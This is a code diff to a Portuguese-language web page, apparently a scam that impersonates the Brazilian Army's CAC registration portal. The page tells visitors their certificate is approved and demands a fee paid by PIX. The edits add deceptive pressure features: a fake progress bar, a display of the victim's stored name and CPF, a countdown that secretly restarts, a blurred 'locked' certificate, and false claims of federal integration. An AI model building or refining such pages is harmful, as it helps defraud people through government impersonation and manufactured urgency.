@@ -112,7 +112,7 @@
             100% { opacity: 0; }
         }
 
-.loading-screen {
+        .loading-screen {
             position: fixed;
             top: 0;
             left: 0;
@@ -165,6 +165,27 @@
         }
         input[readonly], textarea[readonly] { pointer-events: auto; user-select: all; } 
         input[readonly], textarea[readonly] { pointer-events: auto; user-select: all; inputmode: none; }
+
+        /* Estilos Novos para Conversão */
+        .step-active { color: #166534; font-weight: bold; }
+        .step-inactive { color: #9ca3af; }
+        .blur-doc { filter: blur(4px); transition: filter 0.3s ease; }
+        .doc-overlay-text {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: rgba(255, 255, 255, 0.8);
+            padding: 10px 20px;
+            border-radius: 8px;
+            border: 2px solid #1e40af;
+            color: #1e40af;
+            font-weight: bold;
+            text-align: center;
+            width: 80%;
+            z-index: 10;
+            pointer-events: none;
+        }
     </style>
 </head>
 
@@ -196,14 +217,52 @@
     </div>
 
     <main class="container mx-auto px-4 py-10 mt-14">
-        <div class="bg-white shadow-lg rounded-lg overflow-hidden">
-            <div class="bg-green-700 text-white py-4 px-6">
-                <h1 class="text-2xl font-bold">✅ APROVAÇÃO CONFIRMADA: Registro CAC Liberado</h1>
+        
+        <!-- 1. Barra de Progresso -->
+        <div class="max-w-lg mx-auto mb-8 px-4">
+            <div class="flex justify-between items-center text-[10px] uppercase tracking-wider">
+                <div class="flex flex-col items-center gap-1 step-inactive">
+                    <span class="w-6 h-6 rounded-full bg-green-700 text-white flex items-center justify-center text-xs">1</span>
+                    <span>Cadastro</span>
+                </div>
+                <div class="flex-1 h-px bg-gray-300 mx-2 mb-4"></div>
+                <div class="flex flex-col items-center gap-1 step-inactive">
+                    <span class="w-6 h-6 rounded-full bg-green-700 text-white flex items-center justify-center text-xs">2</span>
+                    <span>Análise</span>
+                </div>
+                <div class="flex-1 h-px bg-gray-300 mx-2 mb-4"></div>
+                <div class="flex flex-col items-center gap-1 step-inactive">
+                    <span class="w-6 h-6 rounded-full bg-green-700 text-white flex items-center justify-center text-xs">3</span>
+                    <span>Aprovação</span>
+                </div>
+                <div class="flex-1 h-px bg-green-700 mx-2 mb-4"></div>
+                <div class="flex flex-col items-center gap-1 step-active">
+                    <span class="w-6 h-6 rounded-full bg-green-700 text-white flex items-center justify-center text-xs">4</span>
+                    <span>Emissão</span>
+                </div>
             </div>
+        </div>
+
+        <div class="bg-white shadow-lg rounded-lg overflow-hidden max-w-2xl mx-auto">
+            <div class="bg-green-700 text-white py-4 px-6">
+                <h1 class="text-2xl font-bold text-center">✅ APROVAÇÃO CONFIRMADA</h1>
+            </div>
+
             <div class="p-6">
+                <!-- 3. Efeito Espelho (Dados do Usuário) -->
+                <div id="user-mirror" class="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-6 flex flex-col md:flex-row justify-between items-center gap-4">
+                    <div class="text-sm text-blue-900">
+                        <p><strong>Candidato:</strong> <span id="mirror-name">Carregando...</span></p>
+                        <p><strong>CPF:</strong> <span id="mirror-cpf">Carregando...</span></p>
+                    </div>
+                    <div class="bg-green-100 text-green-800 px-3 py-1 rounded-full text-xs font-bold border border-green-300">
+                        STATUS: APROVADO ✓
+                    </div>
+                </div>
+
                 <div class="mb-6">
-                    <p class="mb-3 text-base">Temos o prazer de informar que você foi aprovado nos testes para a obtenção do Certificado de Registro de Colecionador, Atirador e Caçador (CAC). <strong>Sua vaga foi reservada no sistema e a emissão do documento já foi pré-aprovada.<strong> </p>
-                    <p class="mb-3 text-base">Para concluir a ativação do seu registro e emitir o documento físico, é obrigatória a quitação da taxa de processamento e expedição. <strong>Atenção: a não quitação imediata poderá acarretar a anulação da sua aprovação e a liberação da vaga para a lista de espera.<strong> </p>
+                    <p class="mb-3 text-base">Temos o prazer de informar que você foi aprovado nos testes para a obtenção do Certificado de Registro de Colecionador, Atirador e Caçador (CAC). <strong class="text-green-800">Sua vaga foi reservada no sistema e a emissão do documento já foi pré-aprovada.</strong></p>
+                    <p class="mb-3 text-base">Para concluir a ativação do seu registro e emitir o documento físico, é obrigatória a quitação da taxa de processamento e expedição.</p>
                 </div>
 
                 <div class="bg-gray-100 rounded-lg p-4 mb-6">
@@ -221,6 +280,12 @@
                     </div>
                 </div>
 
+                <!-- 5. Cronômetro de Reserva -->
+                <div id="timer-container" class="text-center mb-6 p-3 bg-yellow-50 border border-yellow-200 rounded-lg">
+                    <p class="text-sm text-yellow-800 font-medium">
+                        ⚠️ Sua vaga está reservada por: <span id="countdown" class="font-bold text-lg text-red-600">15:00</span>
+                    </p>
+                </div>
                 
                 <div id="pix-loading" class="text-center py-8">
                     <div class="spinner mx-auto mb-4"></div>
@@ -237,16 +302,30 @@
                 </div>
             </div>
 
-            <div class="relative mb-6">
-                <img src="documento.png" alt="Documento CAC" class="w-full h-auto max-w-lg mx-auto" />
-                <div id="text-overlay-1"></div>
-                <div id="text-overlay-2"></div>
+            <!-- 4. Substituição do Carimbo por Prévia (Blur) -->
+            <div class="relative mb-6 p-4 bg-gray-50">
+                <div class="relative inline-block w-full max-w-lg mx-auto">
+                    <img src="documento.png" alt="Documento CAC" class="w-full h-auto blur-doc" id="doc-img" />
+                    <div class="doc-overlay-text">
+                        Documento gerado com sucesso.<br>
+                        <span class="text-xs font-normal">Aguardando validação da taxa de emissão para desbloqueio do QR Code de autenticidade.</span>
+                    </div>
+                    <div id="text-overlay-1"></div>
+                    <div id="text-overlay-2"></div>
+                </div>
             </div>
         </div>
     </main>
 
     <footer class="bg-green-900 text-white py-8">
         <div class="container mx-auto px-4">
+            <!-- 2. Prova Social Governamental -->
+            <div class="text-center mb-10 space-y-2">
+                <p class="text-xs text-green-300 uppercase tracking-widest font-semibold">Segurança e Autenticidade</p>
+                <p class="text-sm text-white opacity-80">Sistema de emissão digital integrado ao protocolo de segurança federal.</p>
+                <p class="text-sm text-white opacity-80">Atenção: Certificados emitidos via sistema digital possuem validade imediata após a compensação bancária.</p>
+            </div>
+
             <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-5 gap-8">
                 <div>
                     <h3 class="font-bold mb-3 text-lg">O EXÉRCITO</h3>
@@ -296,6 +375,7 @@
     </div>
 
     <script>
+        // Lógica de preenchimento de dados e Efeito Espelho
         document.addEventListener('DOMContentLoaded', function () {
             let addressData = {};
             try {
@@ -307,18 +387,51 @@
             const name = localStorage.getItem('nome')
                 || localStorage.getItem('nomeCompleto')
                 || addressData.destinatario
-                || '';
+                || 'Usuário';
             const cpf = (localStorage.getItem('cpf')
                 || localStorage.getItem('valorGuardado')
-                || '').replace(/\D/g, '');
+                || '000.000.000-00').replace(/\D/g, '');
 
+            const formattedCpf = cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+
+            // Preenche Overlays do Documento
             const nameOverlay = document.getElementById('text-overlay-1');
             const cpfOverlay = document.getElementById('text-overlay-2');
             if (nameOverlay) nameOverlay.textContent = name;
-            if (cpfOverlay) cpfOverlay.textContent = cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+            if (cpfOverlay) cpfOverlay.textContent = formattedCpf;
+
+            // Preenche Efeito Espelho no topo
+            const mirrorName = document.getElementById('mirror-name');
+            const mirrorCpf = document.getElementById('mirror-cpf');
+            if (mirrorName) mirrorName.textContent = name;
+            if (mirrorCpf) mirrorCpf.textContent = formattedCpf;
         });
 
-    window.addEventListener('load', function() {
+        // Cronômetro de Urgência
+        function startTimer(duration, display) {
+            let timer = duration, minutes, seconds;
+            setInterval(function () {
+                minutes = parseInt(timer / 60, 10);
+                seconds = parseInt(timer % 60, 10);
+
+                minutes = minutes < 10 ? "0" + minutes : minutes;
+                seconds = seconds < 10 ? "0" + seconds : seconds;
+
+                display.textContent = minutes + ":" + seconds;
+
+                if (--timer < 0) {
+                    timer = duration; // Reinicia para não sumir o aviso
+                }
+            }, 1000);
+        }
+
+        window.addEventListener('load', function() {
+            // Inicia cronômetro de 15 minutos
+            const countdownElement = document.getElementById('countdown');
+            if (countdownElement) {
+                startTimer(15 * 60, countdownElement);
+            }
+
             var finalizandoCEO = document.getElementById('finalizandoCEO');
             if(finalizandoCEO) finalizandoCEO.style.display = 'none';
             
